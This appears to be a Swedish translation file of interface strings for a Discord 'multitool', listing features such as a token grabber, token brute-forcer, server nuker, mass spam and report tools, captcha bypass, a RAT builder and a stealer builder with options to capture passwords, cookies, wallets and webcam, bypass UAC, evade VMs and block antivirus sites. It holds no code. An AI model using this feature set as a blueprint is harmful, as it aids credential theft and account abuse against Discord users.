Token Information{end_space8}
Token Inloggning{end_space10}
Token Nuker{end_space14}
Token Grabber{end_space12}
Token Avaktiverare{end_space7}
Token Brute-Force{end_space8}
Falsk Skrivare{end_space11}
Ytlighetsskytt{end_space11}
Gruppchattsspam{end_space10}
Vänner Blockerare{end_space8}
Vänner Borttagare{end_space13}
Vänförfrågningsborttagare
Skapa Nya Servrar{end_space8}
Profiländrare{end_space12}
QR-kodshämtare{end_space11}
Discord Rått Bot{end_space9}
Knapptryckare{end_space12}
Meddelandereaktor{end_space8}
Mass DM{end_space18}
Massanmälan{end_space14}
Massvän{end_space18}
DM Borttagare{end_space12}
DM Rensare{end_space15}
Passera Regler{end_space11}
Passera RestoreCord{end_space6}
Passera Slägghammare{end_space5}
WebHook Verktyg{end_space10}
Skapad av Plingenn{end_space7}
Ändringslogg{end_space13}
Inställningar{end_space12}
Chatt
Hantera Tokens
Nästa Sida{end_space1}
Körs på:{end_space16}
Ogiltigt val, försök igen!
Avbruten av användaren.
Temabytare
Kontoinställningar
Proxyinställningar
Utseendeinställningar
Växla felsökningsläge
Adminpanel
Ogiltig inställning
CYAN
BLÅ
GRÖN
RÖD
VIT
GUL
MAGENTA
LJUSRÖD
LJUSBLÅ
LJUSGRÖN
LJUSCYAN
LJUS SVART
Tema satt till
Kontoinformation
Min licens
Inköpshistorik
Lösa in kod
Ladda ner programvara
Användarnamn
Skapades den
Ändra användarnamn
Logga ut
Användarnamnsändringen misslyckades. Användarnamnet måste innehålla minst 3 tecken.
Vill du logga ut från ditt konto? (Y/N)
Produkt
Utgångsdatum
Datum
Skriv in din produktkod för att få ditt innehåll.
Kod
Du har redan löst in koden.
Se till att spara din produkt innan du trycker på Enter!
Nyckeln hittades inte i svaret
Misslyckades med att hämta data för den angivna koden
URL hittades inte i kodinformationen
Ogiltig kod!
Aktivera/använd proxy
Rensa proxy-cache
Lägg till egna proxys i cache
Skrapa proxy
Ogiltigt val
Felsökningsläge {RED}Avaktiverat
Felsökningsläge {GREEN}Aktiverat
Lade till ny autentiseringssystem
Förbättrade konfigurationssystemet
Omarbetade panelgränssnittet
Lade till chattsystem
Lade till nya kontoinställningar
Implementerade cache för bättre prestanda
Anpassad Discord RPC
Aktivera/Inaktivera Discord RPC
Aktivera/Inaktivera Anpassad Discord RPC
Redigera Anpassad Discord RPC
Anpassad Discord RPC avaktiverad
Anpassad Discord RPC aktiverad
Detaljer (Obligatoriskt)
Detaljer måste vara minst 3 tecken långa.
Status (Obligatoriskt)
Status måste vara minst 3 tecken lång.
Stor bild-URL (Valfritt)
Stor text (Valfritt)
Liten bild-URL (Valfritt)
Liten text (Valfritt)
Hur många knappar vill du ha?
Skriv etikett för knapp
Skriv URL för knapp
Ogiltigt URL-format. Ange en giltig URL.
Ogiltigt antal knappar. Ange ett nummer mellan 0 och 2.
Discord RPC avaktiverad
Discord RPC aktiverad
Normalt läge
RestoreCord-läge (passera captcha)
Cache-kontroll
Anpassad kontroll
Serverkontroll
Ange den anpassade sökvägen för att ladda tokens från
Normal chatt
Supportchatt (Ej tillgänglig)
Privatchatt (Ej tillgänglig)
Server Sökning{end_space11}
Server Kloner{end_space12}
Server Nuker{end_space13}
Token Anslutare{end_space10}
Token Lämnare{end_space12}
Token Spammare{end_space11}
Seizure{end_space18}
Ljudbräda Spammare{end_space7}
Röstchatt Anslutare{end_space6}
Profilbild Ändrare{end_space11}
Global Nick Ändrare{end_space6}
Server Nick Ändrare{end_space9}
HypeSquad Ändrare{end_space8}
Pronomen Ändrare{end_space9}
Språk Ändrare{end_space12}
Status Ändrare{end_space11}
Tema Ändrare{end_space13}
Bio Ändrare{end_space14}
Konto Generator{end_space10}
VideoCrash Skapare{end_space7}
Inställningar Cyklist{end_space8}
Versionsanteckningar{end_space5}
Telegram{end_space17}
Självbot{end_space17}
Github{end_space19}
Om{end_space23}
Avsluta{end_space18}
Föregående sida
Servernamn
Meddelande
Trådantal
Ett fel uppstod:
Inga tokens hittades i cache
Implementerar Rain Nuke
Rain Nuke implementerad. . .
Meddelar
Meddelande-ID:
Skickade ett meddelande till alla tillgängliga vänner.
Lämnade server:
Raderad server:
Följande fel har påträffats och ignoreras:
Raderade/Lämnade alla tillgängliga servrar.
Tar bort vän:
Tog bort vän:
Tog bort alla tillgängliga vänner.
Skapar
Skapad
Skapade alla servrar.
Rain Nuke framgångsrikt detoneras!
Har framgångsrikt förvandlats till en Reme Ödemark
Ange något för att fortsätta. . .
Startar seizure-läge (Växlar mellan Ljus/mörkt läge)
Inte tillräckligt med vänner för att fortsätta.
Ett fel uppstod vid bearbetning av token
Kanal-Spammare
Kanal-ID
Regel Förbigång
Server-ID
Token Falsk Skrivare
Global Nickare
Användarnamn
Server Nickare
Pronomen Ändrare
Slumpmässiga Pronomen (y/n)
Pronomen
Raderade DM:
Inte tillräckligt med DM för att fortsätta.
Cykel avbruten
Ljudbrädespam
Programmet avbröts av användaren.
Misslyckades med att skicka hjärtslag med token:
Misslyckades med att ansluta till röstchatt med token:
Ansluter till röstchatt med tokens..
Uppdaterade inbjudan framgångsrikt, din server kan nu nås av
Misslyckades med att uppdatera skön URL. Statuskod:
Skönkod att snipa
Server-ID att tillämpa skön på
Fördröjning mellan kontroller (sekunder)
Skönskytt har startat. Tryck Ctrl+C för att stoppa.
Fel:
Webhook-Spammare
Webhook-Raderare
Webhook
Webhook raderades framgångsrikt
Tokenhanterare
Spara tokens
Rensa tokens
Kontrollera tokens och spara endast giltiga (y/n)
Token-cache tömd.
Ange sökvägen till textfilen som innehåller tokens
Inga tokens hittades i den angivna textfilen
Token kontroll
Misslyckades med att hämta servernamn:
Ansluter
Rain token brute-force. PS: Detta kan ta lång tid att utföra.
Om du är extremt lycklig och lyckas få tag i någons token, kommer du att hitta den sparad i 'brute-force.txt'.
Sök alltid explicit tillstånd från personen innan du utför en brute force-attack på deras konto.
Ogiltigt användar-id, försök igen!
GILTIG
OGILTIG
Fel vid hämtning av betalningskällor:
Fel vid hämtning av nitro-data:
Ingen betalningsinformation tillgänglig.
Samlar användarinformation & Webdrivrutiner..
Filnamn
Fil lösenord
Vill du ange en ikonfil? (Y/N)
Ogiltig ikon sökväg eller URL. Ställer in ikon till Ingen.
Pinga mig (Y/N)
Anti VM (Y/N)
Starta vid uppstart (Y/N)
UAC-bypass (Y/N)
Smälta (Y/N)
Dölj konsolen (Y/N)
Fånga webbkamera (Y/N)
Fånga lösenord (Y/N)
Fånga kakor (Y/N)
Fånga autofyllningar (Y/N)
Fånga historik (Y/N)
Fånga Discord-tokens (Y/N)
Fånga spel (Y/N)
Fånga Wi-Fi-lösenord (Y/N)
Fånga systeminformation (Y/N)
Fånga skärmbild (Y/N)
Fånga Telegram (Y/N)
Fånga vanliga filer (Y/N)
Fånga plånböcker (Y/N)
Fejkfel (Y/N)
Fejkfelrubrik
Fejkfelmeddelande
Blockera AV-webbplatser (Y/N)
Discordinjektion (Y/N)
Filikon
Skapar {name}.exe, Det här kommer att ta några sekunder. Tack för ditt tålamod!
Fil finns i {path}
Skapade gruppchatt
Ratebegränsad ({response.json()['retry_after']}ms)
Inte tillräckligt med vänner tillgängliga för slumpmässigt urval
Vill du välja användare själv för gruppchatt-spam eller vill du välja slumpmässigt?
Välj användare själv
Slumpmässig urval av användare
Skapar gruppchattar
Användar-id
Du hade inte några kommatecken (,) formatet är id,id2,id3
när som helst för att avbryta
Blockerad:
Fel vid hämtning av relationer:
Inte tillräckligt med vänförfrågningar för att fortsätta.
Inkommande vänförfrågan från:
Borttagen vänförfrågan från:
Totalt antal borttagna vänförfrågningar:
Ett fel uppstod vid skapandet av {server_name}: {e}
Ikon för serverarna yes/no
Slumpmässiga servernamn
Anpassade servernamn
Namn på serverna som kommer att skapas
Ange platsen för ikonen
Kunde inte hitta "{image}" på din dator
Anpassad status
Anpassad biografi
Skapar fil... {i}
Skriver fil... {i}
Notera: Den här koden fungerar inte helt korrekt just nu, men den är fortfarande körbar.\nDu kan dock stöta på fel eller buggar.
Ange namnet du vill ge till den slutliga filen
Ange token för botten du kommer att använda för att utföra RAT-kommandon
Bot-token
Ange guild-ID:t där slash-kommandona är registrerade
Fel vid skrivning av fil: {e}
Fil har skrivits korrekt till "output/{fileName}.py"
Konvertera din skript till en körbar fil (Y/N)
Skapar fil...
Rensar gamla filer...
Den körbara filen har genererats korrekt
Ett HTTP-fel inträffade: {e}
Meddelande-ID
Välj knappen du vill trycka på
{r}({LIGHTBLACK_EX}{i}{r}) Namn: {LIGHTBLACK_EX}{button_label}{r} , Anpassad ID: {LIGHTBLACK_EX}{button_custom_id}
Knapp
Endast en knapp hittades i meddelandet.
Misslyckades med att lägga till reaktion {reaction} till meddelande {message_id}. Maximalt antal reaktioner har redan nåtts.
Maximalt antal reaktioner har redan nåtts.
Misslyckades med att lägga till reaktion {reaction} till meddelande {message_id}. Förbjudet: {error_message}
Objekt
Ansigten
Djur
Symboler
Inga emojis hittades i svaret
Misslyckades med att hämta emojis från API:et
Inbjudningslänk
Ogiltigt inbjudningslänkformat.
Ett fel uppstod vid sändning av begäran
Inbjudningsinformation:
Inbjudarinformation:
Serverinformation:
Kanal
Utgångsdatum
Användar-ID
Märken
Otillgänglig
Namn
Server-ID
Beskrivning
Banner
Banner-URL
Banner-URL (Otillgänglig)
Skön URL
Verifieringsnivå
Splash
Splash-URL
Splash-URL (Otillgänglig)
Funktioner
Seizure startad. Tryck på Ctrl+C för att stoppa.
Seizure avbruten
Språkcykling har startat. Tryck på Ctrl+C för att stoppa.
Ogiltig Token.
Tryck på ENTER för att fortsätta
Discord multiverktyg | https://discord.gg/N4NvXTnQe3 | Skapad av Plingenn
Utseendeinställningar
Textinställningar
Cursorinställningar
Transparensinställningar
Fönsterinställningar
Språkinställningar
Färgschema
Teckensnitt
Teckenstorlek
Radhöjd
Teckenfetstil
Retro Terminal Effekter
Färginställningar
Teckeninställningar
Teckenstorleksinställningar
Radhöjdsinställningar
Teckenfetstilsinställningar
Retroinställningar
Cursorinställningar
Språk satt till {chosen_language}
Onamnad
Typ
Hus
Meddelandelänk
Ogiltig meddelandelänk
Går tillbaka...
Misslyckades med att ansluta till Discord RPC: {e}
Val
Tema
Inställning
Redigera
Språk
Panelopacitet
Ogiltig opacitet
Fönsterinställningar
Denna alternativ är under utveckling
Detta alternativ är för närvarande inte tillgängligt. Var snäll och ha tålamod eftersom det kommer att läggas till senare.
Detta alternativ är för närvarande inte tillgängligt.
Det kommer att ersättas i en av de kommande uppdateringarna med: '{replacement}'.
Denna alternativ är inte tillgängligt
Dessa alternativ är för närvarande under utveckling
Dessa alternativ är för närvarande under utveckling men är användbara. Det är dock troligt att buggar eller fel kan förekomma.
Det gick inte att hämta pronomen från {pronounce_url} ({statuscode})
Proxyanvändning är för närvarande inte tillgänglig. Vi ber om ursäkt för eventuella besvär. Den kommer att göras tillgänglig i en av våra kommande uppdateringar.
Proxyanvändning {RED}Avaktiverat
Proxyanvändning {GREEN}Aktiverat
Lyckades skriva nya proxys
Lyckades skrapa proxys
Klart! Skrapade {proxies} totalt => {temp} | {execution_time}ms
PC{end_space7}
Implementerat flerspråkigt stöd.
Mass Tråd{end_space16}
Forum Spammare
Massanvändar DM{end_space10}
Ej tillämpligt{end_space11}
Serverboostare{end_space16}
Token Onliner{end_space12}
Omröstningsskapare{end_space7}